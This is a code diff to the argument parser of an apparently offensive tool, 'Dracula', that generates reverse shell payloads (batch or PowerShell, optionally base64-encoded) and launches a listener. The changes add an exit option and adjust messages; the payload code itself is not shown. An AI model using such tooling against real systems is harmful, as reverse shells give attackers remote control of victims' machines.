@@ -43,9 +43,10 @@ while True:
     parser = argparse.ArgumentParser(description="Generate a reverse shell payload in form of a batch file.")
     parser.add_argument("-PORT", "--port", help="Port number for the reverse shell")
     parser.add_argument("-OUTFILE", "--output", help="Output file name")
-    parser.add_argument("-CONNECT", "--connect", action="store_true", help="Connects with the target if the target opens the file")
+    parser.add_argument("-CONNECT", "--connect", action="store_true", help="Connects with the target.")
     parser.add_argument("-IP", "--ip", help="Specify the IP address of the target")
     parser.add_argument("-ENCODED", "--encoded", action="store_true", help="generates payload in base64")
+    parser.add_argument("-EXIT", "--exit", action="store_true", help="exit program")
 
     args = parser.parse_args(dracula_cm)
     powershell_script_batch = main.generate_payload_ps(args.ip, args.port, args.output)
@@ -68,9 +69,12 @@ while True:
         elif args.ip and args.port:
             print("PAYLOAD GENERATED, RUN ON TARGET SYSTEM: ")
             print(f"\n{GREEN} {powershell_script}")
+        elif args.exit:
+            print(f"{BV}Exiting Dracula, hope you had a good time!!!{RESET}")
+            exit()
     except Exception as e:
-        print(f"{RED}An error occurred: {e}{RESET}")
+        print(f"{RED}[!]An error occurred: {e}{RESET}")
 
     if args.connect and args.port and args.ip:
-        print(f"{BV}Starting listener on {args.ip}:{args.port}...")
+        print(f"{BV}Starting listener on {args.ip}:{args.port}...{RESET}")
         listener.listener(args.ip, args.port)
